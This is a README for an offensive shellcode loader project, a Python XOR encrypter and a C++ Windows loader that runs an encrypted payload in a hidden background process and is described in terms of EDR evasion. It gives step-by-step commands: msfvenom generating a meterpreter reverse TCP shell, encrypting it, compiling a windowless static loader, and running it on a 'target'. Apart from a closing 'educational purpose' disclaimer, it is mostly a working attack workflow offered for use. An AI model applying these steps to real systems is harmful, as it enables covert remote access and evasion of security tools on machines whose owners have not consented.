# Shellcode Loader

Python Encrypter + C++ Loader

### Features

- XOR encryption with 8-byte rotating key
- External payload loading (data.bin)
- Process detachment : Spawns independent background process (no console window)
- Memory protection


### Files:

`ShellcodeLoaderEncrypter.py`	: XOR encryption script<br>
`ShellcodeLoader.cpp`	: Windows loader<br>


## Usage

### 1- Generate shellcode

**test payload**
```bash
msfvenom -p windows/x64/exec cmd=calc.exe -f raw -o payload.bin
```

**reverse shell**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=_ LPORT=_ -f raw -o payload.bin
```
<br>

### 2- Encryption
```bash
python3 ShellLoaderEncrypter.py payload.bin
```

**output:** 

`data.bin` : encrypted payload

<br>

### 3- Compile loader

```bash
x86_64-w64-mingw32-g++ ShellcodeLoader.cpp -o loader.exe -O2 -s -static -mwindows
```

<br>

### 4- Execute

copy `loader.exe` and `data.bin` to target, then run:


```powershell
C:\> loader.exe
```
---
<br><br>

### License
MIT License - Educational purpose only


### Disclaimer : 
#### Educational Purpose - Intended for

- **security research and education**
- **authorized penetration testing engagements**
- **Malware analysis and defense training**
- **Understanding EDR evasion concepts**

---
